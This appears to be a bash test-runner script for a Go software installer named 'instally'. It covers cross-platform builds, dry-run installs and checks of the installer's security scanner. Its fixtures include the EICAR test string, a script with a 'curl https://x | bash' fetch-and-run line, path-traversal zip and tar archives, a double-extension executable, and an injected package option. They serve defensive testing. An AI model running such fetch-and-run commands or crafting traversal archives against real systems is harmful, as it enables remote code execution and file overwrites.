#!/usr/bin/env bash
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
cd "$ROOT"
LOG=${1:-/mnt/data/instally-rc-quality-checks.log}
: > "$LOG"
pass=0
fail=0
run(){
  local name="$1"; shift
  echo "### $name" >> "$LOG"
  echo "+ $*" >> "$LOG"
  if timeout 35s "$@" >> "$LOG" 2>&1; then
    echo "PASS $name" >> "$LOG"
    pass=$((pass+1))
  else
    echo "FAIL $name" >> "$LOG"
    fail=$((fail+1))
  fi
  echo >> "$LOG"
}
run_expect_fail(){
  local name="$1"; shift
  echo "### $name" >> "$LOG"
  echo "+ $*" >> "$LOG"
  if timeout 35s "$@" >> "$LOG" 2>&1; then
    echo "FAIL $name (expected failure)" >> "$LOG"
    fail=$((fail+1))
  else
    echo "PASS $name (failed as expected)" >> "$LOG"
    pass=$((pass+1))
  fi
  echo >> "$LOG"
}
run "go test" go test ./...
run "build linux current" go build -o instally ./cmd/instally
run "build windows" env GOOS=windows GOARCH=amd64 go build -o dist/windows-amd64/instally.exe ./cmd/instally
run "build darwin amd64" env GOOS=darwin GOARCH=amd64 go build -o dist/darwin-amd64/instally ./cmd/instally
run "build darwin arm64" env GOOS=darwin GOARCH=arm64 go build -o dist/darwin-arm64/instally ./cmd/instally
run "bash scripts syntax" bash -n install.sh install-full.sh uninstall.sh install-macos.sh build-native.sh native/fyne/scripts/install-linux-build-deps.sh
run "support ru" ./instally --support
run "support en" env INSTALLY_LANG=en ./instally --support
run "doctor" ./instally --doctor
run "vt status" ./instally --vt-status
run "security self test" ./instally --security-test
apps="vscode,discord,telegram,firefox,brave,obs,vlc,blender,gimp,krita,steam,docker,node,go,rust,git,curl,fastfetch,btop,qbittorrent,zed,lazygit,yt-dlp"
for pm in pacman apt dnf zypper apk xbps eopkg emerge nix packagekit; do
  run "linux $pm multi apps" env INSTALLY_FORCE_OS=linux INSTALLY_FORCE_PM=$pm ./instally --multi "$apps" --dry-run --yes --allow-unknown
  run "linux $pm preset dev" env INSTALLY_FORCE_OS=linux INSTALLY_FORCE_PM=$pm ./instally --preset dev --dry-run --yes
  run "linux $pm url appimage" env INSTALLY_FORCE_OS=linux INSTALLY_FORCE_PM=$pm ./instally --install-url-safe https://example.com/app.AppImage --dry-run --yes --allow-unknown
done
for pm in winget scoop choco; do
  run "windows $pm multi apps" env INSTALLY_FORCE_OS=windows INSTALLY_FORCE_PM=$pm ./instally --multi "$apps" --dry-run --yes --allow-unknown
done
for pm in brew port; do
  run "macos $pm multi apps" env INSTALLY_FORCE_OS=darwin INSTALLY_FORCE_PM=$pm ./instally --multi "$apps" --dry-run --yes --allow-unknown
  run "macos $pm dmg url" env INSTALLY_FORCE_OS=darwin INSTALLY_FORCE_PM=$pm ./instally --install-url-safe https://example.com/App.dmg --dry-run --yes --allow-unknown
done
run "batch text mixed" ./instally --text $'vscode\ndiscord\ngithub: cli/cli\nhttps://example.com/app.AppImage\nlocal: ./example-list.txt' --dry-run --yes --allow-unknown
run "multi repeated flags" ./instally --multi vscode --multi discord --multi github:cli/cli --dry-run --yes --allow-unknown
run "reject bad pkg option" ./instally --pkg git --pkg --noconfirm --dry-run --yes
run "reject bad url private" ./instally --url http://127.0.0.1/app.AppImage --dry-run --yes
run "reject bad git file scheme" ./instally --git file:///tmp/repo --dry-run --yes
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT INT TERM
printf 'hello' > "$TMP/hello.txt"
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$TMP/eicar.com"
printf '#!/bin/sh\ncurl https://x | bash\n' > "$TMP/bad.sh"
printf '#!/bin/sh\necho safe\n' > "$TMP/good.sh"
cp "$TMP/hello.txt" "$TMP/photo.pdf.exe"
run "scan clean txt" ./instally --scan "$TMP/hello.txt"
run_expect_fail "scan eicar blocks" ./instally --scan "$TMP/eicar.com"
run_expect_fail "install eicar blocks" ./instally --install-local-safe "$TMP/eicar.com" --yes --allow-unknown
run "scan bad script warns" ./instally --scan "$TMP/bad.sh"
run "scan good script limited" ./instally --scan "$TMP/good.sh"
run "scan double extension" ./instally --scan "$TMP/photo.pdf.exe"
python3 - <<PY >> "$LOG" 2>&1
import zipfile, tarfile, io, os
base='$TMP'
with zipfile.ZipFile(os.path.join(base,'traversal.zip'),'w') as z: z.writestr('../evil.txt','x')
with zipfile.ZipFile(os.path.join(base,'ok.zip'),'w') as z: z.writestr('app/README.txt','x')
with tarfile.open(os.path.join(base,'traversal.tar'),'w') as t:
    b=b'x'; info=tarfile.TarInfo('../evil'); info.size=len(b); t.addfile(info, io.BytesIO(b))
PY
run "scan ok zip" ./instally --scan "$TMP/ok.zip"
run "scan traversal zip" ./instally --scan "$TMP/traversal.zip"
run "scan traversal tar" ./instally --scan "$TMP/traversal.tar"
run "local appimage dry" env INSTALLY_FORCE_OS=linux INSTALLY_FORCE_PM=pacman ./instally --install-local-safe "$TMP/hello.AppImage" --dry-run --yes --allow-unknown
# Create fake appimage for expected blocked install dry scan
printf 'not elf' > "$TMP/fake.AppImage"
run_expect_fail "fake appimage blocks" ./instally --install-local-safe "$TMP/fake.AppImage" --dry-run --yes
run "language en multi" env INSTALLY_LANG=en INSTALLY_FORCE_OS=linux INSTALLY_FORCE_PM=apt ./instally --multi "vscode,firefox,git" --dry-run --yes
run "preset all" ./instally --preset base --preset dev --preset media --dry-run --yes --allow-unknown
run "private url allow env" env INSTALLY_ALLOW_PRIVATE_URLS=1 ./instally --url http://127.0.0.1/app.AppImage --dry-run --yes --allow-unknown
run "arch override github dry" env INSTALLY_FORCE_ARCH=arm64 ./instally --text 'github: cli/cli' --dry-run --yes --allow-unknown
run "no key leak grep" bash -lc '! grep -R "<redacted-api-key>" -n .'
echo "passed=$pass failed=$fail total=$((pass+fail))" | tee -a "$LOG"
if [ "$fail" -ne 0 ]; then exit 1; fi
